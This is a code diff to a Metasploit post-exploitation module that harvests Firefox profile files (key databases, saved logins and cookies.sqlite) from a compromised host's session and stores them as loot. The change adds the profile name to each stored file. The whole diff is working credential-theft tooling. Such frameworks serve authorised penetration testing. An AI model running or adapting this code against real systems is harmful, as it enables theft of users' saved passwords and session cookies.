@@ -203,6 +203,8 @@ class Metasploit3 < Msf::Post
 	def download_loot(paths)
 		loot = ""
 		paths.each do |path|
+			print_status(path)
+			profile = path.scan(/Profiles[\\|\/](.+)$/).flatten[0].to_s
 			if session.type == "meterpreter"
 				session.fs.dir.foreach(path) do |file|
 					if file =~ /key\d\.db/ or file =~ /signons/i or file =~ /cookies\.sqlite/
@@ -226,7 +228,7 @@ class Metasploit3 < Msf::Post
 							mime = "binary"
 						end
 						file = file.split('\\').last
-						store_loot("firefox.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "Firefox #{file} File")
+						store_loot("ff.profile.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
 					end
 				end
 			end
@@ -244,7 +246,7 @@ class Metasploit3 < Msf::Post
 							mime = "binary"
 						end
 						file = file.split('/').last
-						store_loot("firefox.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "Firefox #{file} File")
+						store_loot("ff.profile.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
 					end
 				end
 			end
